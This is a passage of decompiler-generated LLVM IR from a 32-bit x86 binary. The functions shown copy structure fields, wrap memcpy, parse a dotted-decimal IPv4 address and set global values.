  %v4_80548da = zext i16 %v3_80548da to i32
  store i32 %v4_80548da, i32* %eax.global-to-local, align 4
  %v0_80548de = load i32, i32* %ebx.global-to-local, align 4
  %v1_80548de = add i32 %v0_80548de, 36
  %v2_80548de = inttoptr i32 %v1_80548de to i32*
  store i32 0, i32* %v2_80548de, align 4
  %v0_80548e5 = load i32, i32* %eax.global-to-local, align 4
  %v1_80548e5 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80548e5 = add i32 %v1_80548e5, 32
  %v3_80548e5 = inttoptr i32 %v2_80548e5 to i32*
  store i32 %v0_80548e5, i32* %v3_80548e5, align 4
  %v0_80548e8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80548e8 = add i32 %v0_80548e8, 20
  %v2_80548e8 = inttoptr i32 %v1_80548e8 to i32*
  %v3_80548e8 = load i32, i32* %v2_80548e8, align 4
  store i32 %v3_80548e8, i32* %eax.global-to-local, align 4
  %v1_80548eb = load i32, i32* %ebx.global-to-local, align 4
  %v2_80548eb = add i32 %v1_80548eb, 44
  %v3_80548eb = inttoptr i32 %v2_80548eb to i32*
  store i32 %v3_80548e8, i32* %v3_80548eb, align 4
  %v0_80548ee = load i32, i32* %esi.global-to-local, align 4
  %v1_80548ee = add i32 %v0_80548ee, 24
  %v2_80548ee = inttoptr i32 %v1_80548ee to i32*
  %v3_80548ee = load i32, i32* %v2_80548ee, align 4
  store i32 %v3_80548ee, i32* %eax.global-to-local, align 4
  %v1_80548f1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80548f1 = add i32 %v1_80548f1, 48
  %v3_80548f1 = inttoptr i32 %v2_80548f1 to i32*
  store i32 %v3_80548ee, i32* %v3_80548f1, align 4
  %v0_80548f4 = load i32, i32* %esi.global-to-local, align 4
  %v1_80548f4 = add i32 %v0_80548f4, 28
  %v2_80548f4 = inttoptr i32 %v1_80548f4 to i32*
  %v3_80548f4 = load i32, i32* %v2_80548f4, align 4
  store i32 %v3_80548f4, i32* %eax.global-to-local, align 4
  %v1_80548f7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80548f7 = add i32 %v1_80548f7, 52
  %v3_80548f7 = inttoptr i32 %v2_80548f7 to i32*
  store i32 %v3_80548f4, i32* %v3_80548f7, align 4
  %v0_80548fa = load i32, i32* %esi.global-to-local, align 4
  %v1_80548fa = add i32 %v0_80548fa, 32
  %v2_80548fa = inttoptr i32 %v1_80548fa to i32*
  %v3_80548fa = load i32, i32* %v2_80548fa, align 4
  store i32 %v3_80548fa, i32* %eax.global-to-local, align 4
  %v1_80548fd = load i32, i32* %ebx.global-to-local, align 4
  %v2_80548fd = add i32 %v1_80548fd, 56
  %v3_80548fd = inttoptr i32 %v2_80548fd to i32*
  store i32 %v3_80548fa, i32* %v3_80548fd, align 4
  %v0_8054900 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054900 = add i32 %v0_8054900, 40
  %v2_8054900 = inttoptr i32 %v1_8054900 to i32*
  %v3_8054900 = load i32, i32* %v2_8054900, align 4
  store i32 %v3_8054900, i32* %eax.global-to-local, align 4
  %v1_8054903 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054903 = add i32 %v1_8054903, 64
  %v3_8054903 = inttoptr i32 %v2_8054903 to i32*
  store i32 %v3_8054900, i32* %v3_8054903, align 4
  %v0_8054906 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054906 = add i32 %v0_8054906, 48
  %v2_8054906 = inttoptr i32 %v1_8054906 to i32*
  %v3_8054906 = load i32, i32* %v2_8054906, align 4
  store i32 %v3_8054906, i32* %eax.global-to-local, align 4
  %v1_8054909 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054909 = add i32 %v1_8054909, 72
  %v3_8054909 = inttoptr i32 %v2_8054909 to i32*
  store i32 %v3_8054906, i32* %v3_8054909, align 4
  %v2_805490f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805490f, i32* @ebx, align 4
  ret i32 %v3_8054906

; uselistorder directives
  uselistorder i32 72, { 4, 3, 5, 0, 6, 7, 8, 1, 9, 10, 11, 12, 2 }
  uselistorder i32 64, { 11, 10, 6, 5, 0, 1, 7, 2, 12, 13, 4, 8, 3, 9 }
  uselistorder i32 40, { 10, 5, 11, 6, 0, 7, 8, 9, 1, 3, 12, 2, 13, 14, 15, 16, 4 }
  uselistorder i32 56, { 9, 8, 0, 1, 2, 3, 4, 5, 10, 11, 12, 13, 14, 6, 15, 16, 17, 7 }
  uselistorder i32 52, { 6, 5, 8, 9, 2, 3, 0, 7, 4, 1 }
  uselistorder i32 48, { 14, 15, 12, 7, 11, 1, 6, 8, 2, 3, 9, 0, 10, 13, 4, 16, 17, 18, 19, 20, 5 }
  uselistorder i32 32, { 58, 59, 63, 37, 48, 64, 65, 60, 34, 52, 53, 66, 1, 0, 2, 3, 43, 4, 5, 6, 7, 8, 38, 67, 39, 44, 45, 49, 46, 47, 35, 10, 9, 12, 11, 13, 14, 41, 40, 50, 51, 54, 55, 15, 56, 17, 16, 42, 57, 61, 36, 62, 68, 18, 19, 20, 21, 69, 22, 23, 70, 71, 25, 24, 27, 26, 28, 29, 72, 30, 31, 73, 74, 75, 32, 33, 76 }
  uselistorder i32 36, { 5, 4, 0, 2, 6, 7, 1, 8, 9, 10, 11, 3 }
  uselistorder i32 14, { 5, 1, 3, 0, 2, 10, 11, 6, 7, 8, 9, 4 }
  uselistorder i32 24, { 46, 47, 18, 44, 45, 54, 48, 49, 50, 7, 8, 0, 1, 14, 35, 31, 9, 12, 19, 13, 20, 21, 10, 37, 32, 22, 11, 23, 36, 24, 25, 26, 27, 28, 29, 30, 33, 34, 38, 39, 40, 43, 42, 41, 15, 2, 51, 52, 53, 5, 16, 4, 3, 55, 17, 6 }
  uselistorder i32 20, { 28, 29, 10, 18, 26, 27, 41, 30, 31, 32, 33, 0, 1, 17, 12, 15, 16, 13, 19, 14, 20, 21, 22, 23, 24, 25, 2, 3, 34, 35, 36, 4, 5, 37, 38, 39, 42, 40, 9, 7, 8, 6, 43, 44, 45, 11 }
  uselistorder i32 16, { 79, 80, 81, 82, 83, 84, 85, 86, 20, 51, 3, 87, 32, 115, 4, 66, 67, 68, 0, 5, 116, 117, 7, 6, 118, 1, 8, 88, 89, 21, 33, 50, 26, 34, 27, 35, 11, 12, 43, 52, 53, 10, 59, 38, 41, 42, 39, 55, 40, 44, 54, 45, 13, 37, 36, 56, 57, 58, 60, 61, 62, 46, 63, 28, 64, 22, 69, 70, 71, 72, 73, 74, 75, 76, 77, 29, 14, 78, 23, 24, 30, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 48, 105, 25, 106, 107, 108, 109, 110, 9, 31, 65, 111, 112, 113, 119, 114, 120, 124, 16, 125, 126, 127, 128, 129, 130, 131, 121, 122, 123, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 2, 142, 143, 144, 145, 146, 147, 148, 149, 19, 150, 17, 18, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 15, 173, 49, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 47 }
  uselistorder i32 8, { 115, 116, 117, 118, 119, 120, 121, 122, 123, 54, 129, 55, 130, 56, 94, 11, 132, 133, 134, 135, 136, 137, 138, 4, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 5, 103, 104, 105, 106, 107, 108, 109, 110, 149, 150, 151, 152, 153, 154, 63, 6, 64, 7, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 62, 172, 173, 8, 174, 175, 176, 177, 9, 178, 124, 125, 126, 127, 131, 58, 65, 59, 66, 60, 67, 179, 180, 181, 68, 98, 97, 12, 95, 99, 100, 101, 13, 102, 111, 112, 113, 114, 14, 15, 16, 17, 18, 10, 69, 0, 19, 20, 128, 70, 71, 21, 72, 73, 22, 23, 74, 24, 1, 2, 182, 51, 183, 29, 30, 28, 35, 184, 27, 33, 34, 75, 61, 76, 77, 31, 78, 32, 79, 3, 25, 52, 185, 36, 80, 37, 81, 38, 39, 40, 41, 82, 42, 43, 44, 83, 45, 84, 186, 85, 46, 86, 47, 87, 187, 88, 48, 89, 49, 90, 91, 92, 50, 26, 188, 53, 189, 93, 96, 57 }
  uselistorder i32 (i8*, i32, i32)* @function_805271a, { 7, 4, 5, 6, 0, 1, 2, 3, 8 }
  uselistorder i32 88, { 0, 2, 1, 3 }
}

define i32 @function_8054912(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8054912:
  %eax.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8054913 = load i32, i32* @esi, align 4
  store i32 %v0_8054913, i32* %stack_var_-8, align 4
  %sext = mul i32 %arg3, 16777216
  %v4_8054914 = sdiv i32 %sext, 16777216
  store i32 %v4_8054914, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v4_805491e = ptrtoint i16* %arg1 to i32
  store i32 %v4_805491e, i32* %edi.global-to-local, align 4
  %v2_8054922 = udiv i32 %v4_8054914, 4
  %v3_8054925 = inttoptr i32 %arg2 to i8*
  %v4_8054925 = bitcast i16* %arg1 to i8*
  %v5_8054925 = call i8* @_memcpy(i8* %v4_8054925, i8* %v3_8054925, i32 %v2_8054922)
  %v0_8054927 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054927 = and i32 %v0_8054927, 2
  %v3_8054927 = icmp eq i32 %v2_8054927, 0
  br i1 %v3_8054927, label %dec_label_pc_805492d, label %dec_label_pc_805492b

dec_label_pc_805492b:                             ; preds = %dec_label_pc_8054912
  %v0_805492b = load i32, i32* %esi.global-to-local, align 4
  %v1_805492b = inttoptr i32 %v0_805492b to i16*
  %v2_805492b = load i16, i16* %v1_805492b, align 2
  %v3_805492b = load i32, i32* %edi.global-to-local, align 4
  %v4_805492b = inttoptr i32 %v3_805492b to i16*
  store i16 %v2_805492b, i16* %v4_805492b, align 2
  %v5_805492b = load i32, i32* %edi.global-to-local, align 4
  %v6_805492b = load i32, i32* %esi.global-to-local, align 4
  %v7_805492b = load i1, i1* @df, align 1
  %v8_805492b = select i1 %v7_805492b, i32 -2, i32 2
  %v9_805492b = add i32 %v8_805492b, %v5_805492b
  %v10_805492b = add i32 %v8_805492b, %v6_805492b
  store i32 %v9_805492b, i32* %edi.global-to-local, align 4
  store i32 %v10_805492b, i32* %esi.global-to-local, align 4
  %v0_805492d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805492d

dec_label_pc_805492d:                             ; preds = %dec_label_pc_8054912, %dec_label_pc_805492b
  %v0_805492d = phi i32 [ %v0_8054927, %dec_label_pc_8054912 ], [ %v0_805492d.pre, %dec_label_pc_805492b ]
  %v2_805492d = urem i32 %v0_805492d, 2
  %v3_805492d = icmp eq i32 %v2_805492d, 0
  br i1 %v3_805492d, label %dec_label_pc_8054932, label %dec_label_pc_8054931

dec_label_pc_8054931:                             ; preds = %dec_label_pc_805492d
  %v0_8054931 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054931 = inttoptr i32 %v0_8054931 to i8*
  %v2_8054931 = load i8, i8* %v1_8054931, align 1
  %v3_8054931 = load i32, i32* %edi.global-to-local, align 4
  %v4_8054931 = inttoptr i32 %v3_8054931 to i8*
  store i8 %v2_8054931, i8* %v4_8054931, align 1
  %v5_8054931 = load i32, i32* %edi.global-to-local, align 4
  %v6_8054931 = load i32, i32* %esi.global-to-local, align 4
  %v7_8054931 = load i1, i1* @df, align 1
  %v8_8054931 = select i1 %v7_8054931, i32 -1, i32 1
  %v9_8054931 = add i32 %v8_8054931, %v5_8054931
  %v10_8054931 = add i32 %v8_8054931, %v6_8054931
  store i32 %v9_8054931, i32* %edi.global-to-local, align 4
  store i32 %v10_8054931, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054932

dec_label_pc_8054932:                             ; preds = %dec_label_pc_805492d, %dec_label_pc_8054931
  store i32 %v4_805491e, i32* %eax.global-to-local, align 4
  %v2_8054936 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8054936, i32* @esi, align 4
  ret i32 %v4_805491e

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 0, 2, 4, 1, 3, 5, 6 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32 -2, { 19, 18, 20, 17, 21, 0, 1, 4, 7, 8, 5, 3, 2, 6, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i1* @df, { 2, 3, 4, 0, 1, 5 }
  uselistorder i32 4, { 2, 180, 181, 182, 183, 184, 185, 235, 236, 238, 239, 240, 241, 242, 237, 56, 94, 243, 245, 246, 248, 251, 252, 253, 254, 255, 256, 3, 257, 258, 259, 260, 261, 262, 263, 264, 249, 250, 159, 59, 160, 161, 162, 163, 164, 165, 166, 4, 168, 167, 265, 5, 266, 58, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 9, 287, 288, 290, 289, 6, 247, 244, 98, 63, 186, 187, 188, 189, 190, 60, 64, 291, 292, 65, 105, 106, 66, 107, 108, 109, 132, 133, 134, 137, 138, 139, 140, 141, 142, 129, 130, 110, 111, 143, 144, 145, 119, 120, 121, 99, 100, 101, 116, 117, 118, 122, 123, 124, 125, 126, 127, 146, 147, 102, 103, 104, 112, 113, 114, 115, 13, 128, 131, 95, 148, 156, 157, 158, 149, 135, 136, 61, 155, 14, 150, 62, 151, 152, 153, 154, 169, 170, 171, 96, 172, 173, 15, 174, 175, 176, 16, 17, 18, 19, 177, 67, 68, 178, 179, 69, 57, 191, 0, 192, 193, 194, 195, 196, 197, 20, 21, 198, 70, 199, 71, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 22, 72, 73, 212, 213, 214, 215, 216, 217, 218, 23, 219, 220, 221, 222, 24, 74, 223, 224, 225, 226, 25, 293, 294, 227, 228, 229, 230, 231, 232, 233, 234, 8, 295, 296, 297, 52, 30, 31, 29, 36, 28, 34, 35, 298, 299, 300, 10, 75, 76, 77, 32, 78, 33, 79, 1, 301, 26, 302, 53, 11, 303, 37, 80, 38, 81, 39, 304, 40, 41, 42, 82, 43, 44, 45, 83, 46, 84, 85, 47, 86, 48, 87, 305, 88, 49, 89, 50, 90, 306, 91, 92, 307, 51, 308, 309, 310, 311, 313, 312, 314, 315, 316, 317, 318, 319, 320, 321, 322, 27, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 54, 12, 7, 350, 55, 93, 351, 97 }
  uselistorder i32 16777216, { 1, 0, 3, 2, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32* @esi, { 120, 121, 38, 39, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 2, 78, 79, 122, 123, 13, 124, 125, 126, 134, 130, 131, 132, 133, 135, 136, 137, 138, 139, 140, 141, 127, 128, 129, 144, 148, 3, 149, 150, 151, 152, 153, 154, 155, 145, 146, 147, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 156, 157, 158, 159, 160, 161, 162, 0, 163, 164, 165, 166, 4, 167, 10, 168, 169, 170, 171, 172, 173, 80, 81, 5, 82, 83, 84, 85, 86, 87, 88, 89, 142, 143, 174, 175, 14, 17, 18, 19, 29, 30, 25, 31, 23, 15, 22, 24, 32, 26, 16, 20, 21, 27, 28, 33, 34, 35, 36, 37, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 115, 105, 106, 107, 109, 108, 1, 110, 111, 112, 113, 11, 114, 176, 177, 178, 116, 117, 118, 9, 179, 180, 119, 181, 182, 6, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 7, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 12, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 8, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 283, 280, 281, 282, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304 }
  uselistorder label %dec_label_pc_8054932, { 1, 0 }
  uselistorder label %dec_label_pc_805492d, { 1, 0 }
}

define i32 @function_8054939(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8054939:
  %v1_8054944 = icmp eq i8* %arg1, null
  br i1 %v1_8054944, label %dec_label_pc_80549c5, label %dec_label_pc_8054948

dec_label_pc_8054948:                             ; preds = %dec_label_pc_8054939
  %v4_8054940 = ptrtoint i8* %arg1 to i32
  %v0_8054956.pre = load i32, i32* bitcast (i32** @global_var_805682c.229 to i32*), align 4
  br label %dec_label_pc_8054953

dec_label_pc_8054953:                             ; preds = %dec_label_pc_8054948, %dec_label_pc_805499c
  %v0_805499c = phi i32 [ 0, %dec_label_pc_8054948 ], [ %v2_80549a2, %dec_label_pc_805499c ]
  %v2_805499f = phi i32 [ 1, %dec_label_pc_8054948 ], [ %v3_805499f, %dec_label_pc_805499c ]
  %v0_8054953 = phi i32 [ %v4_8054940, %dec_label_pc_8054948 ], [ %v0_80549533, %dec_label_pc_805499c ]
  %v1_8054953 = inttoptr i32 %v0_8054953 to i8*
  %v2_8054953 = load i8, i8* %v1_8054953, align 1
  %v3_8054953 = sext i8 %v2_8054953 to i32
  %v2_805495c = mul nsw i32 %v3_8054953, 2
  %v3_805495c = add i32 %v2_805495c, %v0_8054956.pre
  %v4_805495c = inttoptr i32 %v3_805495c to i8*
  %v5_805495c = load i8, i8* %v4_805495c, align 1
  %v6_805495c = and i8 %v5_805495c, 8
  %v7_805495c = icmp eq i8 %v6_805495c, 0
  br i1 %v7_805495c, label %dec_label_pc_80549c5, label %dec_label_pc_8054963

dec_label_pc_8054963:                             ; preds = %dec_label_pc_8054953
  %v4_8054977.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8054977

dec_label_pc_8054967:                             ; preds = %dec_label_pc_8054977
  %v3_8054967 = mul i32 %v1_8054967, 10
  %v2_805496a = add i32 %v3_8054967, -48
  %v3_805496a = add i32 %v2_805496a, %v2_8054979
  %v1_805496e = add i32 %v3_805496a, -255
  %v6_805496e = sub i32 254, %v3_805496a
  %v7_805496e = and i32 %v6_805496e, %v3_805496a
  %v8_805496e = icmp slt i32 %v7_805496e, 0
  %v9_805496e = icmp eq i32 %v1_805496e, 0
  %v10_805496e = icmp slt i32 %v1_805496e, 0
  %v3_8054974 = icmp eq i1 %v10_805496e, %v8_805496e
  %v4_8054974 = icmp eq i1 %v9_805496e, false
  %v5_8054974 = and i1 %v4_8054974, %v3_8054974
  br i1 %v5_8054974, label %dec_label_pc_80549c5, label %dec_label_pc_8054976

dec_label_pc_8054976:                             ; preds = %dec_label_pc_8054967
  %v1_8054976 = add i32 %v0_8054976, 1
  br label %dec_label_pc_8054977

dec_label_pc_8054977:                             ; preds = %dec_label_pc_8054963, %dec_label_pc_8054976
  %v1_8054967 = phi i32 [ 0, %dec_label_pc_8054963 ], [ %v3_805496a, %dec_label_pc_8054976 ]
  %v4_8054977 = phi i32 [ %v4_8054977.pre, %dec_label_pc_8054963 ], [ %v6_8054977, %dec_label_pc_8054976 ]
  %v0_8054976 = phi i32 [ %v0_8054953, %dec_label_pc_8054963 ], [ %v1_8054976, %dec_label_pc_8054976 ]
  %v1_8054977 = inttoptr i32 %v0_8054976 to i8*
  %v2_8054977 = load i8, i8* %v1_8054977, align 1
  %v3_8054977 = zext i8 %v2_8054977 to i32
  %v5_8054977 = and i32 %v4_8054977, -256
  %v6_8054977 = or i32 %v3_8054977, %v5_8054977
  store i32 %v6_8054977, i32* @edx, align 4
  %v2_8054979 = sext i8 %v2_8054977 to i32
  %v2_805497c = mul nsw i32 %v2_8054979, 2
  %v3_805497c = add i32 %v2_805497c, %v0_8054956.pre
  %v4_805497c = inttoptr i32 %v3_805497c to i16*
  %v5_805497c = load i16, i16* %v4_805497c, align 2
  %v2_8054981 = and i16 %v5_805497c, 8
  %v3_8054981 = icmp eq i16 %v2_8054981, 0
  %v1_8054983 = icmp eq i1 %v3_8054981, false
  br i1 %v1_8054983, label %dec_label_pc_8054967, label %dec_label_pc_8054985

dec_label_pc_8054985:                             ; preds = %dec_label_pc_8054977
  %v8_8054985 = sub nsw i32 2, %v2_805499f
  %v9_8054985 = and i32 %v8_8054985, %v2_805499f
  %v10_8054985 = icmp slt i32 %v9_8054985, 0
  %v11_8054985 = icmp eq i32 %v2_805499f, 3
  %v12_8054985 = icmp slt i32 %v2_805499f, 3
  %v3_8054989 = icmp eq i1 %v12_8054985, %v10_8054985
  %v4_8054989 = icmp eq i1 %v11_8054985, false
  %v5_8054989 = and i1 %v4_8054989, %v3_8054989
  br i1 %v5_8054989, label %dec_label_pc_8054993, label %dec_label_pc_805498b

dec_label_pc_805498b:                             ; preds = %dec_label_pc_8054985
  %v10_805498b = icmp eq i8 %v2_8054977, 46
  %v1_805498e = icmp eq i1 %v10_805498b, false
  br i1 %v1_805498e, label %dec_label_pc_80549c5, label %dec_label_pc_8054990

dec_label_pc_8054990:                             ; preds = %dec_label_pc_805498b
  %v1_8054990 = add i32 %v0_8054976, 1
  br label %dec_label_pc_805499c

dec_label_pc_8054993:                             ; preds = %dec_label_pc_8054985
  %v1_8054993 = add i32 %v0_8054976, 1
  %v4_8054994 = icmp eq i8 %v2_8054977, 0
  br i1 %v4_8054994, label %dec_label_pc_805499c, label %dec_label_pc_8054998

dec_label_pc_8054998:                             ; preds = %dec_label_pc_8054993
  %v2_8054998 = and i16 %v5_805497c, 32
  %v3_8054998 = icmp eq i16 %v2_8054998, 0
  br i1 %v3_8054998, label %dec_label_pc_80549c5, label %dec_label_pc_805499c

dec_label_pc_805499c:                             ; preds = %dec_label_pc_8054998, %dec_label_pc_8054993, %dec_label_pc_8054990
  %v0_80549533 = phi i32 [ %v1_8054993, %dec_label_pc_8054998 ], [ %v1_8054993, %dec_label_pc_8054993 ], [ %v1_8054990, %dec_label_pc_8054990 ]
  %v2_805499c = mul i32 %v0_805499c, 256
  %v3_805499f = add nuw nsw i32 %v2_805499f, 1
  %v2_80549a2 = or i32 %v1_8054967, %v2_805499c
  %v7_80549a8 = icmp sgt i32 %v2_805499f, 3
  br i1 %v7_80549a8, label %dec_label_pc_80549aa, label %dec_label_pc_8054953

dec_label_pc_80549aa:                             ; preds = %dec_label_pc_805499c
  %v4_80549af = icmp eq i32 %arg2, 0
  br i1 %v4_80549af, label %dec_label_pc_80549c7, label %dec_label_pc_80549b6

dec_label_pc_80549b6:                             ; preds = %dec_label_pc_80549aa
  %v1_80549ba = call i32 @llvm.bswap.i32(i32 %v2_80549a2)
  %v2_80549bc = inttoptr i32 %arg2 to i32*
  store i32 %v1_80549ba, i32* %v2_80549bc, align 4
  br label %dec_label_pc_80549c7

dec_label_pc_80549c5:                             ; preds = %dec_label_pc_8054998, %dec_label_pc_805498b, %dec_label_pc_8054953, %dec_label_pc_8054967, %dec_label_pc_8054939
  br label %dec_label_pc_80549c7

dec_label_pc_80549c7:                             ; preds = %dec_label_pc_80549aa, %dec_label_pc_80549b6, %dec_label_pc_80549c5
  %v0_80549cc = phi i32 [ 1, %dec_label_pc_80549aa ], [ 1, %dec_label_pc_80549b6 ], [ 0, %dec_label_pc_80549c5 ]
  ret i32 %v0_80549cc

; uselistorder directives
  uselistorder i32 %v2_8054979, { 1, 0 }
  uselistorder i32 %v6_8054977, { 1, 0 }
  uselistorder i8 %v2_8054977, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8054976, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805496e, { 1, 0 }
  uselistorder i32 %v3_805496a, { 1, 0, 3, 2 }
  uselistorder i32 %v2_805499f, { 1, 4, 2, 0, 3, 5 }
  uselistorder i32 256, { 1, 23, 27, 24, 2, 3, 4, 5, 0, 6, 7, 28, 21, 8, 9, 11, 10, 22, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 26 }
  uselistorder i32 3, { 1, 2, 0, 29, 15, 32, 6, 7, 11, 3, 8, 12, 4, 20, 21, 22, 23, 24, 25, 26, 16, 9, 27, 28, 13, 14, 10, 30, 31, 5, 33, 18, 19, 34, 17 }
  uselistorder i16 0, { 0, 1, 7, 8, 4, 5, 6, 2, 3 }
  uselistorder i32 -256, { 4, 38, 39, 40, 41, 42, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 8, 9, 23, 10, 13, 15, 24, 17, 18, 19, 5, 6, 7, 11, 12, 14, 16, 20, 21, 22, 27, 25, 26, 28, 29, 30, 31, 32, 33, 34, 35, 2, 3, 36, 37, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 68, 69, 70, 71, 0, 72, 73, 74, 1, 75, 76, 77, 78, 79 }
  uselistorder i32 -48, { 2, 3, 4, 0, 1, 5, 6 }
  uselistorder i32 10, { 1, 18, 19, 13, 20, 2, 25, 8, 0, 3, 9, 4, 10, 5, 11, 16, 15, 14, 12, 17, 21, 22, 23, 6, 24, 7, 26, 27, 28 }
  uselistorder i32* @edx, { 23, 3, 67, 68, 69, 32, 18, 0, 20, 21, 55, 56, 57, 58, 19, 70, 71, 73, 74, 77, 76, 72, 78, 86, 87, 4, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 5, 101, 102, 84, 85, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 6, 49, 50, 51, 103, 148, 149, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 7, 141, 142, 143, 144, 145, 146, 147, 83, 22, 80, 59, 60, 150, 82, 61, 75, 79, 62, 81, 151, 152, 1, 153, 154, 155, 8, 156, 157, 158, 159, 160, 161, 162, 9, 163, 15, 24, 25, 26, 27, 13, 14, 11, 10, 28, 16, 29, 12, 31, 30, 52, 53, 54, 17, 63, 64, 65, 66, 2, 164, 165, 166, 167, 168, 169, 170 }
  uselistorder i8 0, { 46, 47, 85, 86, 68, 33, 43, 69, 6, 87, 88, 89, 90, 58, 91, 92, 93, 94, 95, 96, 34, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 2, 112, 113, 114, 115, 48, 52, 53, 49, 54, 50, 51, 55, 0, 56, 57, 60, 62, 59, 7, 61, 8, 63, 64, 65, 66, 67, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 70, 25, 26, 71, 27, 28, 29, 30, 31, 32, 72, 73, 74, 75, 76, 5, 77, 78, 9, 79, 80, 81, 82, 83, 84, 35, 36, 116, 117, 3, 119, 120, 118, 121, 122, 123, 124, 4, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 44, 145, 1, 146, 37, 45, 38, 39, 40, 41, 42 }
  uselistorder i32 2, { 55, 56, 57, 1, 88, 21, 89, 29, 52, 0, 30, 48, 31, 49, 32, 50, 15, 2, 84, 20, 3, 4, 5, 78, 6, 7, 8, 22, 23, 90, 9, 10, 27, 11, 33, 24, 28, 36, 34, 35, 17, 16, 25, 37, 26, 38, 60, 61, 74, 75, 63, 58, 62, 64, 65, 66, 67, 68, 69, 70, 71, 59, 72, 73, 13, 53, 40, 39, 79, 80, 81, 82, 83, 41, 44, 42, 45, 19, 43, 12, 46, 51, 47, 85, 86, 87, 14, 18, 76, 77, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 54 }
  uselistorder i8* null, { 34, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80549c7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80549c5, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8054977, { 1, 0 }
  uselistorder label %dec_label_pc_8054953, { 1, 0 }
}

define i32 @function_80549cd() local_unnamed_addr {
dec_label_pc_80549cd:
  %v0_80549cd = load i32, i32* @eax, align 4
  %v1_80549cd = add i32 %v0_80549cd, 28
  %v2_80549cd = inttoptr i32 %v1_80549cd to i32*
  %v3_80549cd = load i32, i32* %v2_80549cd, align 4
  store i32 %v3_80549cd, i32* @global_var_8056ef8.247, align 8
  %v1_80549d6 = add i32 %v0_80549cd, 44
  %v2_80549d6 = inttoptr i32 %v1_80549d6 to i32*
  %v3_80549d6 = load i32, i32* %v2_80549d6, align 4
  store i32 %v3_80549d6, i32* @global_var_8056efc.248, align 4
  ret i32 %v3_80549d6

; uselistorder directives
